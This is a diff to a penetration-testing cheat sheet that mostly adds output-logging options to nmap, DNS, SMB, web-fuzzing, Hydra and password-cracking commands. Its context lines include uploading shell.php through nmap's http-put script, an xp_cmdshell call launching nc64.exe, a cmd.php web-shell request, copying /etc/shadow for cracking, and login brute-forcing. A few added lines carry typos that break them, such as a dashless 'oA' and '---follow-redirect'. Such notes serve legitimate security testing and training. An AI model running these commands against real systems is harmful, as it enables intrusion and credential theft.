@@ -80,7 +80,7 @@ sudo nmap -sn -oA $(date +%Y-%m-%d_%H%M)_host_disc
 grep 'Status: Up' *.gnmap | awk '{print $2}' > live_hosts.txt
 
 # Use that list
-sudo nmap -sn -iL live_hosts.txt
+sudo nmap -sn -iL live_hosts.txt -oA $(date +%Y-%m-%d_%H%M)_host_disc_live <TARGET>
 ```
 #### 🌐 DNS Lookups
 
@@ -221,7 +221,7 @@ These scans are used to bypass simple, stateless firewalls or an IDS that is onl
 UDP scanning is slower and less reliable than TCP scanning due to the connectionless nature of UDP.
 
 ```bash
-sudo nmap -sU --top-ports 20 -v  # UDP is slow and unreliable
+sudo nmap -sU --top-ports 20 -v -oA $(date +%Y-%m-%d_%H%M)_udp_scan <TARGET>  # UDP is slow and unreliable
 ```
 
 |State|Description|
@@ -249,7 +249,7 @@ The Nmap Scripting Engine (NSE) extends Nmap's functionality with custom scripts
 - Search for scripts: `grep "ftp" /usr/share/nmap/scripts/script.db`
 
 ```bash
-nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' <TARGET>
+nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' -oA $(date +%Y-%m-%d_%H%M)_http_put <TARGET>
 ```
 
 ##### 📂 Script Categories
@@ -286,55 +286,56 @@ nmap --script-updatedb
 
 ```bash
 # Check for anonymous FTP login
-sudo nmap -Pn --script ftp-anon <TARGET>
+sudo nmap -Pn --script ftp-anon -oA $(date +%Y-%m-%d_%H%M)_ftp_anon <TARGET>
 
 # Scan SMB ports for information and vulnerabilities
-sudo nmap -n -Pn -p 137,139,445 --script nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users <TARGET>
+sudo nmap -n -Pn -p 137,139,445 --script nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users -oA $(date +%Y-%m-%d_%H%M)_smb_enum <TARGET>
 
 # Advanced Scans
-sudo nmap -sS -p53 <NETBLOCK>
-sudo nmap -sU -p53 <NETBLOCK>
+sudo nmap -sS -p53 <NETBLOCK> -oA $(date +%Y-%m-%d_%H%M)_dns_tcp
+sudo nmap -sU -p53 -oA $(date +%Y-%m-%d_%H%M)_dns_udp <NETBLOCK>
 sudo nmap -n -Pn -sS -sV \
   --max-retries 1 \
   --host-timeout 45s \
   --initial-rtt-timeout 300ms \
   --max-rtt-timeout 1000ms \
   -p 21,22,23,25,53,80,110,135,139,443,445,3389 \
+  -oA $(date +%Y-%m-%d_%H%M)_comprehensive_scan
   <TARGET>
 
 # whois
-nmap -n -Pn -sn --script whois-domain <TARGET_DOMAIN>
+nmap -n -Pn -sn --script whois-domain oA $(date +%Y-%m-%d_%H%M)_whois <TARGET_DOMAIN>
 
 # Attempts to list available SMB shares on the target
-nmap -p 445 --script smb-enum-shares <TARGET>
+nmap -p 445 --script smb-enum-shares -oA $(date +%Y-%m-%d_%H%M)_smb_shares <TARGET>
 ```
 
 #### 🔍 Additional Service Scans
 ```bash
 # DNS service discovery
-sudo nmap -sU -Pn -n -p 53 --script=dns-recursion,dns-service-discovery <TARGET>
+sudo nmap -sU -Pn -n -p 53 --script=dns-recursion,dns-service-discovery -oA $(date +%Y-%m-%d_%H%M)_dns_scripts <TARGET>
 
 # NTP information gathering
-sudo nmap -sU -Pn -n -p 123 --script=ntp-info <TARGET>
+sudo nmap -sU -Pn -n -p 123 --script=ntp-info -oA $(date +%Y-%m-%d_%H%M)_ntp_info <TARGET>
 
 # SNMP enumeration
-sudo nmap -sU -Pn -n -p 161 --script=snmp-info <TARGET>
-sudo nmap -sU -Pn -n -p 161 --script=snmp-brute <TARGET>
+sudo nmap -sU -Pn -n -p 161 --script=snmp-info <TARGET> -oA $(date +%Y-%m-%d_%H%M)_snmp_info
+sudo nmap -sU -Pn -n -p 161 --script=snmp-brute -oA $(date +%Y-%m-%d_%H%M)_snmp_brute <TARGET>
 
 # NetBIOS name service
-sudo nmap -sU -Pn -n -p 137 --script=nbstat <TARGET>
+sudo nmap -sU -Pn -n -p 137 --script=nbstat -oA $(date +%Y-%m-%d_%H%M)_nbstat <TARGET>
 
 # DHCP discovery
-sudo nmap -sU -Pn -n -p 67 --script=dhcp-discover <TARGET>
+sudo nmap -sU -Pn -n -p 67 --script=dhcp-discover -oA $(date +%Y-%m-%d_%H%M)_dhcp_discover <TARGET>
 
 # TFTP enumeration
-sudo nmap -sU -Pn -n -p 69 --script=tftp-enum <TARGET>
+sudo nmap -sU -Pn -n -p 69 --script=tftp-enum -oA $(date +%Y-%m-%d_%H%M)_tftp_enum <TARGET>
 
 # SSDP discovery
-sudo nmap -sU -Pn -n -p 1900 --script=ssdp-discover <TARGET>
+sudo nmap -sU -Pn -n -p 1900 --script=ssdp-discover -oA $(date +%Y-%m-%d_%H%M)_ssdp_discover <TARGET>
 
 # IKE version detection
-sudo nmap -sU -Pn -n -p 500 --script=ike-version <TARGET>
+sudo nmap -sU -Pn -n -p 500 --script=ike-version -oA $(date +%Y-%m-%d_%H%M)_ike_version <TARGET>
 ```
 
 ### 🔍 `ffuf` Fuzzing
@@ -390,9 +391,9 @@ ffuf -s -c -o ffuf_vhosts -w /usr/share/seclists/Discovery/DNS/subdomains-top1mi
 - DNSDumpster: https://dnsdumpster.com/
 
 ```bash
-whois <TARGET>
+whois <TARGET> > whois_$(date +%Y-%m-%d_%H%M).txt
 
-dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE>
+dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE> > dns_$(date +%Y-%m-%d_%H%M).txt
 # --- Record Types ---
 # ANY: return all records -- sometimes doesnt work!
 # A: IPv4 address
@@ -405,16 +406,16 @@ dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE>
 # TXT: Text Records
 # SRV: Service Records
 # CAA: Certification Authority Authorization
-for type in A AAAA CNAME MX NS SOA SRV TXT ; do echo '---' ; dig +short $type <TARGET> ; done
+for type in A AAAA CNAME MX NS SOA SRV TXT ; do echo '---' ; dig +short $type <TARGET> >> dns_all_records_$(date +%Y-%m-%d_%H%M).txt ; done
 
 # IP -> DNS
-dig -x <IP_ADDR>
+dig -x <IP_ADDR> > dns_reverse_$(date +%Y-%m-%d_%H%M).txt
 
 # RARE: DNS Zone Transfer
-dig axfr @<DNS_SERVER> <TARGET>
+dig axfr @<DNS_SERVER> <TARGET> > dns_zone_transfer_$(date +%Y-%m-%d_%H%M).txt
 
 # RARE: older DNS query
-dig @<DNS_SERVER> +noedns +nocookie +norecurse <TARGET>
+dig @<DNS_SERVER> +noedns +nocookie +norecurse <TARGET> > dns_legacy_$(date +%Y-%m-%d_%H%M).txt
 # EDNS breaks on Win, norecurse usu for internal networks
 ```
 
@@ -440,10 +441,10 @@ get <FILENAME>
 
 ```bash
 # Perform a full enumeration of a target using enum4linux
-enum4linux -a <TARGET>
+enum4linux -a <TARGET> > enum4linux_$(date +%Y-%m-%d_%H%M).txt
 
 # List available SMB shares without password
-smbclient -N --list <HOSTNAME>
+smbclient -N --list <HOSTNAME> > smb_shares_$(date +%Y-%m-%d_%H%M).txt
 
 # Connect to an SMB share with a null session (no password)
 smbclient -N //<TARGET>/<SHARE>
@@ -457,14 +458,14 @@ get <FILE>           # Download file
 recurse              # Toggle directory recursion
 
 # SMB enumeration:
-sudo nmap -p 445 --script "smb-enum-domains,smb-os-discovery" <TARGET>
+sudo nmap -p 445 --script "smb-enum-domains,smb-os-discovery" -oA $(date +%Y-%m-%d_%H%M)_smb_domains <TARGET>
 
 # LDAP-based enumeration
 # Useful when SMB queries are blocked or hardened.
-sudo nmap -p 389 --script ldap-search --script-args 'ldap.search.base="",ldap.search.filter="(objectClass=*)",ldap.search.attributes="namingContexts"' <TARGET>
+sudo nmap -p 389 --script ldap-search --script-args 'ldap.search.base="",ldap.search.filter="(objectClass=*)",ldap.search.attributes="namingContexts"' -oA $(date +%Y-%m-%d_%H%M)_ldap_search <TARGET>
 
 # DNS / Start of Authority
-dig @<TARGET> SOA
+dig @<TARGET> SOA > dns_soa_$(date +%Y-%m-%d_%H%M).txt
 ```
 
 ### 📂 SMB Administrative Shares
@@ -476,7 +477,7 @@ dig @<TARGET> SOA
 #### SMB Share Interaction
 ```bash
 # List shares anonymously
-smbclient -N -L //<TARGET_IP>
+smbclient -N -L //<TARGET_IP> > smb_list_$(date +%Y-%m-%d_%H%M).txt
 
 # Connect to a public share anonymously
 smbclient -N //<TARGET_IP>/Public
@@ -567,10 +568,10 @@ xp_cmdshell "powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe 
 
 ```bash
 # Enumerates web server + version + OS + frameworks + JS libraries
-whatweb --aggression 3 http://<TARGET>
+whatweb --aggression 3 http://<TARGET> --log-brief=whatweb_scan.txt
 
 # Command-line web vulnerability scanner
-wapiti --url http://<TARGET>
+wapiti -f txt -o wapiti_scan --url http://<TARGET>
 
 nikto -o nikto_scan.txt -h http://<TARGET>
 ```
@@ -579,13 +580,17 @@ nikto -o nikto_scan.txt -h http://<TARGET>
 
 ```bash
 # Directory brute-force with a common wordlist
-gobuster --quiet --threads 64 --output gobuster_dir_common dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url <TARGET>
+gobuster --quiet --threads 64 --output gobuster_dir_common dir --follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url http://<TARGET>
 
 # Directory brute-force using a larger wordlist
-gobuster --quiet --threads 64 --output gobuster_dir_medium dir -r -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u <TARGET>
+gobuster --quiet --threads 64 --output gobuster_dir_medium dir --follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --url http://<TARGET>
 
 # Same with file extensions
-gobuster --quiet --threads 64 --output gobuster_dir_medium dir -r -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -u <TARGET>
+gobuster --quiet --threads 64 --output gobuster_dir_medium dir ---follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --extensions php,html,txt,bak,zip --url http://<TARGET>
+
+### FEROXBUSTER: faster and recursive
+
+feroxbuster -t 64 -o feroxbuster_dir_common --depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<TARGET>:3333
 ```
 
 ### 🌐 Subdomains
@@ -604,16 +609,16 @@ gobuster --quiet --threads 64 --output gobuster_vhost_top5000 vhost -w /usr/shar
 
 ```bash
 # Enumerate Wordpress users
-wpscan --enumerate u --url http://<TARGET>/
+wpscan --enumerate u --output wpscan_users.txt --url http://<TARGET>/
 
 # Brute-force creds
-wpscan --password-attack wp-login --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --url http://<TARGET>/
+wpscan --password-attack wp-login --output wpscan_bruteforce.txt --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --url http://<TARGET>/
 ```
 
 #### 🌐 cURL
 ```bash
 # Fetch only the HTTP headers of a webpage
-curl -I <TARGET>
+curl -I <TARGET> > http_headers_$(date +%Y-%m-%d_%H%M).txt
 
 # Attempt to upload a file to a web server
 curl --upload-file <FILE> <TARGET>/<FILENAME>
@@ -675,7 +680,7 @@ The exploitation phase focuses on gaining initial access to target systems throu
 # Update Searchsploit
 searchsploit --update
 # Search
-searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
+searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc' > searchsploit_$(date +%Y-%m-%d_%H%M).txt
 ```
 - https://nvd.nist.gov/vuln/search#/nvd/home
 
@@ -698,7 +703,7 @@ Crack hashes:
 man 5 crypt
 
 # Spotty: but IDs hashes
-hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1'
+hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1' > hashid_$(date +%Y-%m-%d_%H%M).txt
 
 hash-identifier
 ```
@@ -708,13 +713,13 @@ hash-identifier
 ### 🔨 Brute-Forcing Web & SSH Logins with Hydra
 ```bash
 # Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
-hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -o hydra_web_login.txt
 
 # Wordpress brute-force login form with a complex request string (ONLINE - use small wordlist)
-hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -V
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -V -o hydra_wp_login.txt
 
 # SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
-hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT>
+hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT> -o hydra_ssh_login.txt
 ```
 
 ### 🔨 SMB Password Spraying with CrackMapExec
@@ -964,7 +969,7 @@ nc -nv <TARGET> <PORT>
 ```
 #### ▶️ Run commands
 ```bash
-curl http://<TARGET>/cmd.php?cmd=ls
+curl http://<TARGET>/cmd.php?cmd=ls > cmd_output_$(date +%Y-%m-%d_%H%M).txt
 ```
 
 ---
@@ -1439,7 +1444,7 @@ cp /etc/shadow .
 unshadow passwd shadow > hashes.txt
 
 # 3. Crack the hashes
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --output=jonh_cracked_hashes.txt hashes.txt
 ```
 
 ### ⏰ Scheduled Tasks (Cron Jobs)
@@ -1579,10 +1584,10 @@ john --list=formats
 # john --format=NT
 # john --format=raw-md5
 # john --format=sha512crypt
-john --format=<FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt /path/to/hash.txt
+john --format=<FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt --output=john_cracked_hashes.txt /path/to/hash.txt
 # Single crack mode: makes permutations given a username
 # bobby:1234567890ABCDEF
-john --single --format=<FORMAT> /path/to/hash.txt
+john --single --format=<FORMAT> --output=john_cracked_single.txt /path/to/hash.txt
 # Zipfiles
 zip2john <ZIP_FILE> > hash_zip.txt
 # RARfiles
@@ -1595,10 +1600,10 @@ ssh2john <ID_RSA> > hash_id_rsa.txt
 
 ```bash
 # Crack an MD5crypt hash with a salt using Hashcat
-hashcat -O -a 0 -m 20 <HASH>:<SALT> /usr/share/wordlists/rockyou.txt
+hashcat -O -a 0 -m 20 <HASH>:<SALT> /usr/share/wordlists/rockyou.txt --outfile=hashcat_cracked_hashes.txt
 
 # Crack a SHA512crypt hash using Hashcat
-hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt --outfile=hashcat_cracked_hashes.txt
 ```
 
 ## 🍃 Databases
@@ -1655,7 +1660,7 @@ hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ```bash
 # Enhanced nmap scan for MySQL service
-nmap - -Pn -sV -p 3306 -A <TARGET>  # Better service enumeration
+nmap -Pn -sV -p 3306 -A -oA $(date +%Y-%m-%d_%H%M)_mysql_enum <TARGET>  # Better service enumeration
 
 # Connect to MySQL/MariaDB with mycli (enhanced MySQL client)
 mycli -u root -h <TARGET>
